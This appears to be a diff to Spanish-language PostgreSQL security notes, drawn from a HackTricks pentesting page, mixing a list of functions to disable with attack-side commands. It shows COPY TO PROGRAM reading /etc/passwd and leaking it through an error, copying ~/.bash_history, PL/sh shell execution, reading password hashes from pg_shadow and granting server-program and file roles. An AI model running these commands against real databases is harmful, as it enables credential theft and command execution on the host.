@@ -7,6 +7,10 @@ COPY ( select '' ) TO PROGRAM 'cat > /tmp/data.txt && cat /etc/passwd >> /tmp/da
 
 --- El contenido del passwd se te mostrara en la primera linea que dice "ERROR:  invalid input syntax for type bigint:"
 COPY cat_prueba from  PROGRAM 'cat /tmp/test2.txt';
+
+--- En linux puede usar el comando para ver el historial de comandos, esto lo puedes juntar con el comando copy y puedes ver todo lo que se ejecuta
+cat ~/.bash_history > /tmp/historial.txt
+
 ```
 
 
@@ -16,3 +20,103 @@ select now();
 select string_agg()
 select current_database();
 ```
+
+
+# Funciones que se tienen que desactivar 
+
+FUNCIONES
+
+-- Manipulacion de ficheros 
+pg_read_file
+pg_write_file
+copy
+pgcrypto
+
+-- ejecutar comandos de manera remota 
+dblink
+
+-- Ejecutas bash 
+La extensión PL/sh en PostgreSQL se utiliza para ejecutar código en lenguaje de shell (como bash) dentro de funciones almacenadas en la base de datos
+```
+CREATE OR REPLACE FUNCTION my_function() RETURNS void AS $$
+#!/bin/bash
+# Aquí puedes escribir tu código en lenguaje de shell
+echo "Hola desde PL/sh en PostgreSQL"
+# Puedes ejecutar comandos del sistema, manipular archivos, etc.
+$$ LANGUAGE plsh;
+
+SELECT my_function();
+```
+
+
+
+
+```
+-- Puedes ver las extensiones disponibles para habilitar
+select * from pg_available_extensions where name ilike '%fdw%';
+
+-- Puedes ver las extensiones habilitadas 
+select * from pg_extension 
+
+-- habilitar una extension 
+CREATE EXTENSION IF NOT EXISTS postgres_fdw;
+
+-- Eliminas las extensiones
+DROP EXTENSION IF EXISTS postgres_fdw CASCADE; 
+```
+
+
+
+
+
+
+
+
+
+
+```
+-- ver la zona horaria
+current_setting('TIMEZONE')
+
+# Get current user
+SELECT user;
+SELECT pg_backend_pid();
+
+# Get current database
+SELECT current_catalog;
+
+# List schemas
+SELECT schema_name,schema_owner FROM information_schema.schemata;
+\dn+
+
+#List databases
+SELECT datname FROM pg_database;
+
+#Read credentials (usernames + pwd hash)
+SELECT usename, passwd from pg_shadow;
+
+# Get languages
+SELECT lanname,lanacl FROM pg_language;
+
+# Show installed extensions
+SHOW rds.extensions;
+SELECT * FROM pg_extension;
+
+# Get history of commands executed
+\s
+select * from pg_stat_statements ;
+
+GRANT pg_execute_server_program TO "username";
+GRANT pg_read_server_files TO "username";
+GRANT pg_write_server_files TO "username";
+
+## If response is "on" then true, if "off" then false
+SELECT current_setting('is_superuser');
+
+
+SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
+```
+
+
+bibliografía  :
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
